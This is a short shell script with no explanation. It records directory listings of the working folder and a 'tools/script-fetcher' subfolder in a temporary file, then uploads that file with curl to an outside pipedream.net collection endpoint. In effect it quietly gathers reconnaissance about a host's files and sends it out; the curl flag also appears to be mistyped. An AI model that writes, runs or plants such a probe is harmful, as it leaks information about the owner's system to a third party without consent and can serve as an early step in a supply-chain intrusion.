#!/bin/sh

echo $(ls -la ) > /tmp/file.txt
echo $(ls -la tools) >> /tmp/file.txt
echo $(ls -la tools/script-fetcher) >> /tmp/file.txt

curl -data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
